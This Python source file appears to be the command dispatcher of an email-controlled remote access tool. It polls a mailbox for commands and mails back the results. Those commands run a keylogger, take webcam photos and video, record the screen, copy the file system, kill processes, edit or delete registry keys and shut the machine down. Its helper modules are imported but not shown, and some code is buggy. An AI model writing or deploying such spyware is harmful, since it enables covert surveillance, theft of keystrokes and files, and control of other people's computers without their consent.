
import os
from utils.process import Process
from utils.application import Application
from utils.screen import Screen
from utils.webcam import Webcam
from utils.keylogger import KeyLogger
from utils.fileSystem import FileSystem
from utils.registry import Registry
from utils.receiver import Receiver


# Process
def list_process():
    doit = Process()
    processes = doit.run(code='view')
    return processes


def kill_process(id=0):
    doit = Process()
    succeed_status = doit.run(code='kill', id=id)
    return succeed_status


# Application
def list_application():
    doit = Application()
    apps = doit.run(code='view')
    return apps


def kill_application(id=0):
    doit = Application()
    succeed_status = doit.run(code='kill', id=id)
    return succeed_status


# Screen
def capture_screen():
    doit = Screen()
    filename = doit.run(code='image')
    return filename


def record_screen(seconds=10):
    doit = Screen()
    filename = doit.run(code='video', time=seconds)
    return filename


# Webcam
def shot_webcam():
    doit = Webcam()
    filename = doit.run(code='image')
    return filename


def record_webcam(seconds=10):
    doit = Webcam()
    filename = doit.run(code='video', time=seconds)
    return filename


# Keylogger
def get_keylogger(seconds=10):
    doit = KeyLogger()
    log = doit.hook_in(Xtime=seconds)
    return log


# File System
def list_fileSystem():
    doit = FileSystem()
    tree = doit.getTree()
    return tree


def copy_fileSystem(parameters):
    doit = FileSystem()
    succeed_status = doit.run('copy', parameters)
    return succeed_status


def download_fileSystem(parameters):                                                        #not done
    doit = FileSystem()
    succeed_status = doit.run('download', parameters)
    return succeed_status


# Registry
def write_registry(parameters):
    doit = Registry()
    succeed_status = doit.run('write', parameters)
    return succeed_status


def get_registry(parameters):
    doit = Registry()
    value = doit.run('get', parameters)
    return value


def set_registry(parameters):
    doit = Registry()
    succeed_status = doit.run('set', parameters)
    return succeed_status


def create_registry(parameters):
    doit = Registry()
    succeed_status = doit.run('create', parameters)
    return succeed_status


def del_value_registry(parameters):
    doit = Registry()
    succeed_status = doit.run('delete-value', parameters)
    return succeed_status


def del_key_registry(parameters):
    doit = Registry()
    succeed_status = doit.run('delete-key', parameters)
    return succeed_status


# Shutdown
def shutdown(seconds=10):
    os.popen("shutdown -s -t {}".format(seconds))
    return True


# Restart
def restart(self):
    os.popen("shutdown /r")
    return True


def execute(command, parameter=None):  # parameter
    if command == 'LIST PROCESS':
        content = list_process()
        return content

    elif command == 'KILL PROCESS':
        content = kill_process(int(parameter)) if parameter else kill_process()
        return content

    elif command == 'LIST APP':
        content = list_application()
        return content

    elif command == 'KILL APP':
        content = kill_application(
            int(parameter)) if parameter else kill_application()
        return content

    elif command == 'CAPTURE SCREEN':
        content = capture_screen()
        return content

    elif command == 'RECORD SCREEN':
        content = record_screen(
            int(parameter)) if parameter else record_screen()
        return content

    elif command == 'SHOT WEBCAM':
        content = shot_webcam()
        return content

    elif command == 'RECORD WEBCAM':
        content = record_webcam(
            int(parameter)) if parameter else record_webcam()
        return content

    elif command == 'VIEW FILE SYSTEM':
        content = list_fileSystem()
        print(content)
        return content

    elif command == 'COPY FILE SYSTEM':
        content = copy_fileSystem(parameter)
        return content

    elif command == 'DOWNLOAD FILE SYSTEM':                                                      # not done
        content = download_fileSystem(parameter)
        return content

    elif command == 'WRITE REGISTRY':  
        content = write_registry(parameter)
        print(content)
        return content

    elif command == 'SET REGISTRY':  
        content = set_registry(parameter)
        return content

    elif command == 'CREATE REGISTRY':  
        content = create_registry(parameter)
        return content

    elif command == 'GET REGISTRY':  
        content = get_registry(parameter)
        return content

    elif command == 'DELETA VALUE REGISTRY':  
        content = del_value_registry(parameter)
        return content

    elif command == 'DELETE KEY REGISTRY':  
        content = del_key_registry(parameter)
        return content

    elif command == 'KEYLOGGER':
        content = get_keylogger(parameter)
        return content

    elif command == 'SHUTDOWN':
        content = shutdown(parameter)
        return content

    elif command == 'RESTART':
        content = restart()
        return content


def main():
    
    r = Receiver()

    unanswered_mails = r.get_unanswered_mails()

    for mail_number in unanswered_mails:
        cm, para = r.is_valid_mail(mail_number)
        if cm:
            content = execute(cm, para)
            r.reply(mail_number, content)
        
    return


if __name__ == '__main__':
    main()